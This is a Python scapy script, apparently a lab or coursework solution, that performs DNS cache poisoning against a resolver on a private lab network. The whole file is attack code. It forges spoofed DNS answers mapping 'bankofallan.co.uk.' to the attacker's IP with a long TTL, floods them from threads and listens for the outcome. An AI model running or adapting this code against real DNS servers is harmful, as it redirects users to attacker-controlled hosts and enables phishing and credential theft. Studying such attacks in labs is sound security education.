
from scapy.layers.inet import *
from scapy.layers.dns import *
import socket
import signal
import threading
from threads.DNSRequestSender import DNS_Sender


def build_dns_request_packet(destination_ip, destination_port, query_name):
    id=0
    dns_req = IP(dst=destination_ip) / UDP(dport=destination_port) / DNS(id=id, rd=1, qd=DNSQR(qname=query_name))
    return dns_req
def build_dns_poisoner_packet(destination_ip, destination_port, source_ip,source_port,query_to_forger, fake_ip, ttl):
    id = 0
    dnsqr = DNSQR(qname=query_to_forger).qname
    dns_resp = IP(dst=destination_ip, src=source_ip) / UDP(dport=destination_port, sport=source_port) / DNS(id=id,
                                                                                                              qd=DNSQR(
                                                                                                                  qname=query_to_forger,
                                                                                                              ),
                                                                                                              an=DNSRR(
                                                                                                                  rrname=query_to_forger,
                                                                                                                  type='A',
                                                                                                                  rclass="IN",
                                                                                                                  rdata=fake_ip,
                                                                                                                  rdlen=4,
                                                                                                                  ttl=ttl))

    return dns_resp
def launch_dns_listen_server(ip, port, buffer_size):
    udp_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp_socket.bind((ip, port))
    return udp_socket
def sig_hand(signum, frame):
    dns_request_sender.end_thread()
    dns_poisoner.end_thread()
    exit(0)
#setting variables
buffer_size = 1024
localhost = "127.0.0.1"
local_port = 1337
dns_ip = "192.168.56.101"
local_ip = "192.168.56.1"
local_port_dns = 55553
dns_port = 53
ttl_to_poison = 50000
query_to_forger = "bankofallan.co.uk."
#setting signal such that we can use ctrl+c
signal.signal(signal.SIGINT, sig_hand)
global dns_request_sender
dns_request_sender = DNS_Sender()
dns_request_sender.set_packet(  build_dns_request_packet(dns_ip, dns_port, query_to_forger) )
sender_thread = dns_request_sender.get_thread()
global dns_poisoner
dns_poisoner = DNS_Sender()
dns_poisoner.set_packet( build_dns_poisoner_packet(dns_ip, dns_port, local_ip, local_port_dns, query_to_forger, local_ip, ttl_to_poison) )
dns_poisoner_thread = dns_poisoner.get_thread()
udp_socket = launch_dns_listen_server(localhost, local_port, buffer_size)
dns_poisoner_thread.start()
# sender_thread.start()
bytePair = udp_socket.recvfrom(buffer_size)
#ends thread runs
dns_request_sender.end_thread()
dns_poisoner.end_thread()
#write result into a file
file_name = "udp_received.txt"
file = open(file_name, "w")
file.write(str(bytePair))
file.close()
print(bytePair)